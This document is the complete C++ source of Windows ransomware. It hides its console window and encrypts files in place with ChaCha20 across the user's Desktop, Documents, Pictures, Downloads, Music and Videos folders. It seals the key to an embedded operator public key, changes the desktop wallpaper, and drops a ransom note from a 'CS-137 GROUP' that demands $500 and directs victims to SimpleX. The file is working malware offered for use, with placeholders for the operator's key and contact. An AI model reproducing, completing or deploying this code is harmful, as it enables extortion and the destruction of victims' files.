#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <sodium.h>
#include "resource.h"
#include <random>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

namespace fs = std::filesystem;

// Magic string to mark encrypted files
const std::string MAGIC_STRING = "ENCRYPTED_CHACHA20"; // 18 bytes

// Utility to convert bytes to hex string
std::string to_hex_string(const unsigned char* data, size_t length) {
    std::string result;
    char hex[3];
    for (size_t i = 0; i < length; i++) {
        sprintf_s(hex, sizeof(hex), "%02x", data[i]);
        result += hex;
    }
    return result;
}

// Operator's public key (replace with your generated public key)
static const unsigned char OPERATOR_PUBLIC_KEY[crypto_box_PUBLICKEYBYTES] = {0x7b, 0xf5, 0xb7, 0x5a, 0xec, 0x23, 0x93, 0xca, 0x60, 0x99, 0x42, 0xfd, 0xec, 0xd4, 0x4d, 0x26, 0x04, 0x2a, 0x9f, 0x3d, 0x62, 0xa9, 0xa3, 0x09, 0xa5, 0xa1, 0x3b, 0xaa, 0x7d, 0x1d, 0xb4, 0x25};

// Generate Unique ID by encrypting key and nonce with operator's public key
std::string generate_unique_id(const unsigned char* master_key, size_t key_len, const unsigned char* nonce, size_t nonce_len) {
    size_t plaintext_len = key_len + nonce_len;
    std::vector<unsigned char> plaintext(plaintext_len);
    memcpy(plaintext.data(), master_key, key_len);
    memcpy(plaintext.data() + key_len, nonce, nonce_len);

    std::vector<unsigned char> ciphertext(crypto_box_SEALBYTES + plaintext_len);
    if (crypto_box_seal(ciphertext.data(), plaintext.data(), plaintext_len, OPERATOR_PUBLIC_KEY) != 0) {
        throw std::runtime_error("Fail");
    }
    return to_hex_string(ciphertext.data(), ciphertext.size());
}

std::string extractResourceToTemp(int resourceID, const std::string& fileExtension) {
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_WALLPAPER), RT_RCDATA);
    if (hRes == NULL) {
        MessageBoxA(NULL, ("FindResourceA failed in extract. Error: " + std::to_string(GetLastError())).c_str(), "Debug", MB_OK);
        return "";
    }
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (hData == NULL) {
        MessageBoxA(NULL, "LoadResource failed", "Debug", MB_OK);
        return "";
    }
    DWORD size = SizeofResource(NULL, hRes);
    if (size == 0) {
        MessageBoxA(NULL, "SizeofResource returned 0", "Debug", MB_OK);
        return "";
    }
    void* data = LockResource(hData);
    if (data == NULL) {
        MessageBoxA(NULL, "LockResource failed", "Debug", MB_OK);
        return "";
    }

    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath) == 0) {
        MessageBoxA(NULL, "GetTempPathA failed", "Debug", MB_OK);
        return "";
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 99999);
    std::string tempFile = std::string(tempPath) + "wallpaper" + std::to_string(dis(gen)) + fileExtension;

    std::ofstream file(tempFile, std::ios::binary);
    if (!file) {
        MessageBoxA(NULL, ("Failed to open temp file: " + tempFile).c_str(), "Debug", MB_OK);
        return "";
    }
    file.write(static_cast<const char*>(data), size);
    file.close();

    if (!std::filesystem::exists(tempFile)) {
        MessageBoxA(NULL, ("File not created: " + tempFile).c_str(), "Debug", MB_OK);
        return "";
    }
    return tempFile;
}

bool is_file_encrypted(const fs::path& filePath) {
    std::ifstream inputFile(filePath, std::ios::binary);
    if (!inputFile) return false;

    std::string header(MAGIC_STRING.length(), '\0');
    inputFile.read(&header[0], MAGIC_STRING.length());
    inputFile.close();
    return header == MAGIC_STRING;
}

void chacha20EncryptFile(const fs::path& filePath, const unsigned char* key, const unsigned char* nonce) {
    // Skip if already encrypted
    if (is_file_encrypted(filePath)) {
        return;
    }

    std::ifstream inputFile(filePath, std::ios::binary);
    if (!inputFile) {
        return;
    }
    std::vector<unsigned char> buffer((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
    inputFile.close();

    std::vector<unsigned char> encrypted(buffer.size());
    crypto_stream_chacha20_xor(encrypted.data(), buffer.data(), buffer.size(), nonce, key);

    std::ofstream outputFile(filePath, std::ios::binary);
    if (!outputFile) {
        return;
    }
    // Write magic string, encrypted data, and nonce
    outputFile.write(MAGIC_STRING.c_str(), MAGIC_STRING.length());
    outputFile.write(reinterpret_cast<char*>(encrypted.data()), encrypted.size());
    outputFile.write(reinterpret_cast<const char*>(nonce), crypto_stream_chacha20_NONCEBYTES);
    outputFile.close();
}

void traverseAndEncrypt(const fs::path& dirPath, const unsigned char* key, const unsigned char* nonce) {
    for (const auto& entry : fs::recursive_directory_iterator(dirPath)) {
        if (fs::is_regular_file(entry)) {
            chacha20EncryptFile(entry.path(), key, nonce);
        }
    }
}

void setWallpaper(const std::string& imagePath) {
    // [Unchanged from your original]
    if (!std::filesystem::exists(imagePath)) return;

    HMODULE hOle32 = LoadLibraryA("ole32.dll");
    if (!hOle32) return;

    typedef HRESULT(WINAPI *CoInitializeFunc)(LPVOID);
    typedef void(WINAPI *CoUninitializeFunc)();
    typedef HRESULT(WINAPI *CoCreateInstanceFunc)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);

    CoInitializeFunc pCoInitialize = (CoInitializeFunc)GetProcAddress(hOle32, "CoInitialize");
    CoUninitializeFunc pCoUninitialize = (CoUninitializeFunc)GetProcAddress(hOle32, "CoUninitialize");
    CoCreateInstanceFunc pCoCreateInstance = (CoCreateInstanceFunc)GetProcAddress(hOle32, "CoCreateInstance");

    if (!pCoInitialize || !pCoUninitialize || !pCoCreateInstance) {
        FreeLibrary(hOle32);
        return;
    }

    std::wstring wImagePath = std::filesystem::absolute(imagePath).wstring();
    IActiveDesktop* pActiveDesktop = nullptr;

    HRESULT hr = pCoInitialize(NULL);
    if (FAILED(hr)) {
        FreeLibrary(hOle32);
        return;
    }

    hr = pCoCreateInstance(CLSID_ActiveDesktop, NULL, CLSCTX_INPROC_SERVER, IID_IActiveDesktop, (void**)&pActiveDesktop);
    if (FAILED(hr)) {
        pCoUninitialize();
        FreeLibrary(hOle32);
        return;
    }

    WALLPAPEROPT wpo;
    wpo.dwSize = sizeof(WALLPAPEROPT);
    wpo.dwStyle = WPSTYLE_STRETCH;

    pActiveDesktop->SetWallpaper(wImagePath.c_str(), 0);
    pActiveDesktop->SetWallpaperOptions(&wpo, 0);
    pActiveDesktop->ApplyChanges(AD_APPLY_ALL);

    pActiveDesktop->Release();
    pCoUninitialize();
    FreeLibrary(hOle32);
}

void createAndOpenReadme(const fs::path& desktopPath, const std::string& unique_id) {
    std::string content =
        "GREETINGS FROM CS-137 GROUP!\n"
		"----------------------------\n"
        "Your files have been ENCRYPTED with ChaCha20.\n"
		"You must contact us and pay a fee ($500) to recover your files.\n"
		"Find us here: YOUR CONTACT HEREn"
        "----------------------------\n"
		"Your Unique ID is: " + unique_id + "\n"
		"Provide this ID to the operator to recover your files.\n"
		"Once confirmed, the decryption program will be sent to you via SimpleX";
    fs::path readmePath = desktopPath / "README.txt";
    std::ofstream readme(readmePath);
    if (readme.is_open()) {
        readme << content;
        readme.close();
        ShellExecuteA(NULL, "open", readmePath.string().c_str(), NULL, NULL, SW_SHOWNORMAL);
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (sodium_init() < 0) {
        std::cerr << "Libsodium initialization failed." << std::endl;
        return 1;
    }

    // Generate master key and nonce
    unsigned char key[crypto_stream_chacha20_KEYBYTES]; // 32 bytes
    unsigned char nonce[crypto_stream_chacha20_NONCEBYTES]; // 8 bytes
    randombytes_buf(key, sizeof(key));
    randombytes_buf(nonce, sizeof(nonce));

    // Generate Unique ID
    std::string unique_id = generate_unique_id(key, sizeof(key), nonce, sizeof(nonce));

    // Encrypt files
    std::vector<std::wstring> commonFolders = {
        L"Desktop", L"Documents", L"Pictures", L"Downloads", L"Music", L"Videos"
    };
    wchar_t userProfile[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile) != S_OK) {
        return 1;
    }
    for (const auto& folder : commonFolders) {
        fs::path dirPath = fs::path(userProfile) / folder;
        if (fs::exists(dirPath) && fs::is_directory(dirPath)) {
            traverseAndEncrypt(dirPath, key, nonce);
        }
    }

    // Set wallpaper
    std::string imagePath = extractResourceToTemp(IDR_WALLPAPER, ".jpg");
    if (imagePath.empty()) {
        MessageBoxA(NULL, "Failed to extract wallpaper", "Debug", MB_OK);
        return 1;
    }
    setWallpaper(imagePath);
    std::filesystem::remove(imagePath);

    // Create and open README
    fs::path desktopPath = fs::path(userProfile) / L"Desktop";
    createAndOpenReadme(desktopPath, unique_id);

    return 0;
}